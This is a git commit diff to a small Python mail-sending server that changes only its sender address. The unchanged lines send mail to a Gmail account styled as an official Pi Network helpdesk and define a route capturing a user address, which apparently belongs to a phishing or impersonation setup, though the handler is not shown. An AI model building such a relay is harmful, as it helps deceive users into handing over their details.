718538e46c827a80e9b41744db1ff62f6a423242
CipherX <ukovictor8@gmail.com>
2025-07-07 09:19:02 +0100

    new

--- server.py
+++ server.py
@@ -19,7 +19,7 @@ CORS(app)
 # 
 
 API_TOKEN = os.getenv('MAILSENDER_API')
-FROM_EMAIL = 'noreply@test-vz9dlemm9214kj50.mlsender.net'  
+FROM_EMAIL = 'noreply@test-pzkmgq7z9znl059v.mlsender.net'
 TO_EMAIL = 'pinetworkofficialhelpdesk@gmail.com' 
 
 @app.route('/<user_address>')
